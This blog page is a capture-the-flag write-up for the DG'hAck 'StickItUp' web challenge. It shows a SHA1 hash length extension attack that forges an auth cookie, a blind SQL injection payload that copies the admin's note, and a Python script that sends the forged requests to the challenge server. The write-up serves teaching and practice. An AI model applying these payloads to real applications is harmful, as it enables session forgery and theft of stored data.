<!doctype html><html lang=en-us><head><link rel=preconnect href=https://fonts.gstatic.com/ crossorigin><link rel=stylesheet href=/css/main.min.3c9fa6b3264a9f8be4f27730f1d5f0ded496304d03812ed49d97703ffb28122a.css integrity="sha256-PJ+msyZKn4vk8ncw8dXw3tSWME0DgS7UnZdwP/soEio=" crossorigin=anonymous media=screen><link rel=stylesheet href="https://fonts.googleapis.com/css?family=Didact+Gothic"><meta charset=utf-8><meta http-equiv=x-ua-compatible content="chrome=1"><meta name=HandheldFriendly content="True"><meta name=MobileOptimized content="320"><meta name=viewport content="width=device-width,initial-scale=1"><meta name=referrer content="no-referrer"><title>Writeup DG&rsquo;hAck: StickItUp - Nicolas Bourras</title><meta name=twitter:card content="summary"><meta name=twitter:title content="Writeup DG'hAck: StickItUp"><meta name=twitter:description content="When starting this challenge, we&rsquo;re greeted by two forms, a login one and a registration one. Registering for an account allows us to login, which brings us to this dashboard:

We&rsquo;re asked to find a note created by the admin user. I started by trying a few SQLi on the login page (they didn&rsquo;t work), and noticed this in the source code:
<!-- $_COOKIES['auth'] = 'testuser:' . sha1(SECRET_KEY . 'testuser'); --> So the auth cookie format is username:hash, where the hash is a SHA1 of a secret plus the username."><meta property="og:title" content="Writeup DG'hAck: StickItUp"><meta property="og:description" content="When starting this challenge, we&rsquo;re greeted by two forms, a login one and a registration one. Registering for an account allows us to login, which brings us to this dashboard:

We&rsquo;re asked to find a note created by the admin user. I started by trying a few SQLi on the login page (they didn&rsquo;t work), and noticed this in the source code:
<!-- $_COOKIES['auth'] = 'testuser:' . sha1(SECRET_KEY . 'testuser'); --> So the auth cookie format is username:hash, where the hash is a SHA1 of a secret plus the username."><meta property="og:type" content="article"><meta property="og:url" content="https://nicolasb.fr/blog/writeup-dghack-stickitup/"><meta property="article:published_time" content="2020-11-30T11:26:24+01:00"><meta property="article:modified_time" content="2020-11-30T11:26:24+01:00"><title>Writeup DG&rsquo;hAck: StickItUp</title></head><body><header class="wrap flex-container"><h1>Writeup DG&rsquo;hAck: StickItUp</h1></header><main class=wrap><div class=flex-container><aside role=complementary>Nov 30, 2020 &#183; 503 words<div class=tag-container><span class=tag><a href=/tags/blog/>blog</a></span>
<span class=tag><a href=/tags/security/>security</a></span>
<span class=tag><a href=/tags/ctf/>ctf</a></span>
<span class=tag><a href=/tags/dghack/>dghack</a></span></div></aside><hr><article role=article><p>When starting this challenge, we&rsquo;re greeted by two forms, a login one and a registration one. Registering for an account allows us to login, which brings us to this dashboard:</p><p><a href=/assets/dghack/stick-it-up-dashboard.png><img src=/assets/dghack/stick-it-up-dashboard.png alt="The dashboard"></a></p><p>We&rsquo;re asked to find a note created by the <code>admin</code> user. I started by trying a few SQLi on the login page (they didn&rsquo;t work), and noticed this in the source code:</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=color:#f92672>&lt;!--</span> $_COOKIES[<span style=color:#e6db74>&#39;auth&#39;</span>] <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;testuser:&#39;</span> <span style=color:#f92672>.</span> <span style=color:#a6e22e>sha1</span>(<span style=color:#a6e22e>SECRET_KEY</span> <span style=color:#f92672>.</span> <span style=color:#e6db74>&#39;testuser&#39;</span>); <span style=color:#f92672>--&gt;</span>
</code></pre></div><p>So the <code>auth</code> cookie format is <code>username:hash</code>, where the hash is a SHA1 of a secret plus the username.</p><p>Now this <strong>should</strong> immediatly make you think of an <a href=https://blog.skullsecurity.org/2012/everything-you-need-to-know-about-hash-length-extension-attacks>hash key length extension attack</a>. It allows an attacker to append arbitrary data at the end of the hashed value.</p><p>Looking at the cookies, we do find the hash:</p><pre><code>test:14dc77bd8d95f3093afd7b8538a518ac17dcac14
</code></pre><p>Let&rsquo;s check that the attack is working, using the <a href=https://github.com/bwall/HashPump>hashpump tool</a>:</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>$ hashpump -s 14dc77bd8d95f3093afd7b8538a518ac17dcac14 -d test -a suffix -k <span style=color:#ae81ff>16</span>
6cfe1c2b324630def13b186bb3f1c675e79d8c23
test<span style=color:#ae81ff>\x</span>80<span style=color:#ae81ff>\x</span>00<span style=color:#ae81ff>\x</span>00<span style=color:#ae81ff>\x</span>00<span style=color:#ae81ff>\x</span>00<span style=color:#ae81ff>\x</span>00<span style=color:#ae81ff>\x</span>00<span style=color:#ae81ff>\x</span>00<span style=color:#ae81ff>\x</span>00<span style=color:#ae81ff>\x</span>00<span style=color:#ae81ff>\x</span>00<span style=color:#ae81ff>\x</span>00<span style=color:#ae81ff>\x</span>00<span style=color:#ae81ff>\x</span>00<span style=color:#ae81ff>\x</span>00<span style=color:#ae81ff>\x</span>00<span style=color:#ae81ff>\x</span>00<span style=color:#ae81ff>\x</span>00<span style=color:#ae81ff>\x</span>00<span style=color:#ae81ff>\x</span>00<span style=color:#ae81ff>\x</span>00<span style=color:#ae81ff>\x</span>00<span style=color:#ae81ff>\x</span>00<span style=color:#ae81ff>\x</span>00<span style=color:#ae81ff>\x</span>00<span style=color:#ae81ff>\x</span>00<span style=color:#ae81ff>\x</span>00<span style=color:#ae81ff>\x</span>00<span style=color:#ae81ff>\x</span>00<span style=color:#ae81ff>\x</span>00<span style=color:#ae81ff>\x</span>00<span style=color:#ae81ff>\x</span>00<span style=color:#ae81ff>\x</span>00<span style=color:#ae81ff>\x</span>00<span style=color:#ae81ff>\x</span>00<span style=color:#ae81ff>\x</span>00<span style=color:#ae81ff>\x</span>00<span style=color:#ae81ff>\x</span>00<span style=color:#ae81ff>\x</span>00<span style=color:#ae81ff>\x</span>00<span style=color:#ae81ff>\x</span>00<span style=color:#ae81ff>\x</span>00<span style=color:#ae81ff>\x</span>00<span style=color:#ae81ff>\x</span>a0suffix
</code></pre></div><p>The first line is the new hash, the second is the updated data. I tried different keylengths before finding the right one. The cookie we have to set is:</p><pre><code>auth=test%C2%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%C2%A0suffix%3A6cfe1c2b324630def13b186bb3f1c675e79d8c23
</code></pre><p><em>Warning: if you struggle to generate the cookie, be sure that you pasted the username correctly; for example in python use <code>b""</code> instead of <code>""</code>, or directly use the <code>hashpumpy</code> module.</em></p><p>After a quick reload, we see:</p><p><a href=/assets/dghack/stick-it-up-edited-username.png><img src=/assets/dghack/stick-it-up-edited-username.png alt="The edited username seen when logging in"></a></p><p>Which confirms that the exploit is working. For the next part, we have to notice this message on the registration form:</p><p><a href=/assets/dghack/stick-it-up-only-letters-numbers.png><img src=/assets/dghack/stick-it-up-only-letters-numbers.png alt="The registration form"></a></p><p>While it&rsquo;s not unusual for the charset of a username to be restricted, in our case we&rsquo;re free to add any character that we want. It&rsquo;s worth a shot to try an SQLi.</p><p>After adding a single quote to the username, we can&rsquo;t create notes anymore. This is a blind SQLi!</p><p>To help create a payload, we can guess both the table name and structure, as well as the query:</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sql data-lang=sql><span style=color:#66d9ef>CREATE</span> <span style=color:#66d9ef>TABLE</span> note (
    username text,
    title text,
    content text
);

<span style=color:#75715e>-- Add a sample flag.
</span><span style=color:#75715e></span><span style=color:#66d9ef>INSERT</span> <span style=color:#66d9ef>INTO</span> note <span style=color:#66d9ef>VALUES</span> (<span style=color:#e6db74>&#34;admin&#34;</span>, <span style=color:#e6db74>&#34;flag&#34;</span>, <span style=color:#e6db74>&#34;flag&#34;</span>);

<span style=color:#75715e>-- This is the query we&#39;re trying to break.
</span><span style=color:#75715e></span><span style=color:#66d9ef>INSERT</span> <span style=color:#66d9ef>INTO</span> notes <span style=color:#66d9ef>VALUES</span> (username, <span style=color:#e6db74>&#34;title&#34;</span>, <span style=color:#e6db74>&#34;content&#34;</span>);
</code></pre></div><p><a href=http://sqlfiddle.com>SQL Fiddle</a> was of great help. The injection we can find, after a few attempts, is:</p><pre><code>&quot;,&quot;&quot;,&quot;&quot;), (&quot;test&quot;, &quot;flag&quot;, (select content from note a limit 1))#
</code></pre><p>Note the table alias, which I forgot to add for quite a while. The injection works by inserting a second row, in the account that we want, with the first note in the table.</p><p>After creating the updated username and hash, logging in with the forged cookie, and attempting to create a note, we switch to the <code>test</code> account, and see:</p><p><a href=/assets/dghack/stick-it-up-flag.png><img src=/assets/dghack/stick-it-up-flag.png alt="The note of the test user"></a></p><p>Here we go, the flag is <code>-+-{{akUX7Aihx9}}-+-</code>.</p><hr><p>Bonus: the script I used to easily try different SQLi:</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=color:#f92672>import</span> sys
<span style=color:#f92672>import</span> requests
<span style=color:#f92672>import</span> hashpumpy
<span style=color:#f92672>import</span> urllib.parse

DATA <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;test&#34;</span>
SIGNATURE <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;14dc77bd8d95f3093afd7b8538a518ac17dcac14&#34;</span>

suffix <span style=color:#f92672>=</span> sys<span style=color:#f92672>.</span>argv[<span style=color:#ae81ff>1</span>]

new_signature, new_string <span style=color:#f92672>=</span> hashpumpy<span style=color:#f92672>.</span>hashpump(SIGNATURE, DATA, suffix, <span style=color:#ae81ff>16</span>)
cookie <span style=color:#f92672>=</span> urllib<span style=color:#f92672>.</span>parse<span style=color:#f92672>.</span>quote(new_string <span style=color:#f92672>+</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;:&#34;</span> <span style=color:#f92672>+</span> new_signature<span style=color:#f92672>.</span>encode())

requests<span style=color:#f92672>.</span>post(
    <span style=color:#e6db74>&#34;http://stickitup.chall.malicecyber.com/notes.php&#34;</span>,
    data<span style=color:#f92672>=</span>{
        <span style=color:#e6db74>&#34;title&#34;</span>: <span style=color:#e6db74>&#34;test&#34;</span>,
        <span style=color:#e6db74>&#34;text&#34;</span>: <span style=color:#e6db74>&#34;test&#34;</span>,
    },
    cookies<span style=color:#f92672>=</span>{
        <span style=color:#e6db74>&#34;auth&#34;</span>: cookie,
    },
)
</code></pre></div><hr><p><a href=/tags/dghack>View all of the DG&rsquo;hAck articles</a>.</p></article></div><nav role=navigation class="flex-container bottom-menu"><hr><p><a href=/blog>back</a>
&#183;
<a href=/blog>blog</a>
&#183;
<a href=/recipes>recipes</a>
&#183;
<a href=/about>who am I?</a>
&#183;
<a href=/>home</a></p></nav></main><footer class="flex-container footer">Nicolas Bourras&rsquo;s site</footer></body></html>